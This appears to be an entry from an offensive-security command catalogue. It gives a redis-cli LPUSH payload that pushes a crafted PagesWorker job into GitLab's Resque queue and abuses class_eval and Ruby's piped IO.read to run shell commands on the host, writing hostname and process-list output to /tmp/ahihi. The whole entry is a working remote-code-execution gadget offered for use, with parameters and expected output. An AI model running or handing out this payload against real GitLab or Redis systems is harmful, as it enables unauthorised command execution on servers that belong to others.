---
id: cmd-redis-local-file
name: redis-lpush-local-file
type: command
executor: redis-cli
data: >-
  lpush resque:gitlab:queue:system_hook_push
  "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps
  aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
output: Output in /tmp/ahihi
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.296Z'
platforms:
  - Linux
tags:
  - redis
  - local
  - file-write
verified: false
validated: true
submitted: true
---

# redis-lpush-local-file

## Command

```bash
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
```

## Description

Local RCE gadget writing command output to /tmp/ahihi file using PagesWorker.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| key | Queue key | Yes |
| value | JSON for file write | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

File /tmp/ahihi contains hostname and process list.

## Related

- [[procedures/Exploit-Redis-Injection-for-RCE]]
